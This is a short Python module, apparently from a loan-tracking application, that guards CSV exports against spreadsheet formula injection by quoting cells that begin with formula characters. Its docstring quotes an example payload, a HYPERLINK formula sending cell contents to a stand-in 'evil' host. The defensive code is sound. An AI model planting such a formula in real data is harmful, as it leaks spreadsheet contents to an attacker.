"""CSV formula-injection defence.

A spreadsheet treats a cell that starts with ``= + - @`` (or tab/CR) as a formula. A borrower
who names an account ``=HYPERLINK("http://evil/?"&A1,"click")`` would otherwise get that run on
whoever opens the admin's export. Standard mitigation (OWASP): prefix such text with a single
quote, which spreadsheets render as plain text.

Only free-text columns must go through ``sanitize_cell``; numbers and dates are not strings
here, and a legitimately negative amount must stay a number.
``restore_cell`` undoes it, so LoanTrack's own exports re-import unchanged.
"""

from __future__ import annotations

from typing import Any

_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r", "\n")


def sanitize_cell(value: Any) -> Any:
    if isinstance(value, str) and value.startswith(_FORMULA_STARTS):
        return "'" + value
    return value


def restore_cell(value: str) -> str:
    if len(value) >= 2 and value[0] == "'" and value[1] in _FORMULA_STARTS:
        return value[1:]
    return value
